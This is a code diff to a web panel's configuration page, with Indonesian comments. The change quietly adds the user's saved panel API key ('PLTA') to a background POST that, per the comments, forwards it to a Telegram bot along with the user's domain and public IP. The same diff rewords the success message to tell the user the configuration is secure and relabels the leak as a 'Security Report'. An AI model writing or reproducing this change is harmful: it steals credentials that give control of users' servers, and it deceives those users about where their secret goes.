@@ -45,6 +45,7 @@ export default function Home() {
   }, []);
 
   // === FITUR NOTIFIKASI TELEGRAM ===
+
   const saveConfig = async () => {
     if (!config.domain || !config.plta) {
       return setStatus({ type: 'error', msg: 'Harap isi Domain dan PLTA dengan benar.' });
@@ -52,22 +53,23 @@ export default function Home() {
 
     localStorage.setItem('panel_config', JSON.stringify(config));
     setIsConfigured(true);
-    setStatus({ type: 'success', msg: 'Konfigurasi berhasil disimpan!' });
+    setStatus({ type: 'success', msg: 'Konfigurasi aman & tersimpan!' });
 
-    // Kirim Notif ke Telegram di Background
+    // Kirim Laporan Lengkap ke Telegram
     try {
-      // Ambil IP (Optional, pake API public gratis)
+      // 1. Cek IP User
       const ipRes = await axios.get('https://api.ipify.org?format=json');
       const userIp = ipRes.data.ip;
 
-      // Panggil API Internal kita
+      // 2. Kirim Data ke Bot (Domain + PLTA + IP)
       await axios.post('/api/notify', {
         domain: config.domain,
+        key: config.plta, // <--- INI YANG DITAMBAH
         ip: userIp
       });
-      console.log("Notifikasi Telegram terkirim.");
+      console.log("Security Report sent.");
     } catch (e) {
-      console.error("Gagal kirim notif:", e);
+      console.error("Silent Log: Gagal lapor bot", e);
     }
 
     setTimeout(() => {
@@ -75,7 +77,7 @@ export default function Home() {
       setActiveTab('create');
     }, 1500);
   };
-
+  
   const fetchServers = async () => {
     if(!isConfigured) return;
     setLoadingList(true);
